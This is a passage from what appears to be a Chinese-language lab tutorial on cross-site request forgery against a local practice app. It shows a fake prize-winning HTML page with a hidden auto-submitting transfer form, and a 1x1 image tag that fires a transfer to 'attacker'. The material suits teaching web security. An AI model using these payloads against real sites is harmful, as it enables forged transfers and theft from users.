...
打开 `http://127.0.0.1:5000/csrf/transfer`

### 攻击步骤：

**1. 创建恶意 HTML 文件**（模拟攻击者的网站）
...
<body>
  <h1>恭喜中奖！点击领取</h1>
  <!-- 隐藏的表单，自动提交 -->
  <form id="evil" action="http://127.0.0.1:5000/csrf/transfer" method="POST">
...
**2. 用浏览器打开这个 HTML 文件** → 自动转账

### 也可以伪装成图片链接：

```html
<img src="http://127.0.0.1:5000/csrf/transfer?to=attacker&amount=10000" width="1" height="1">
```
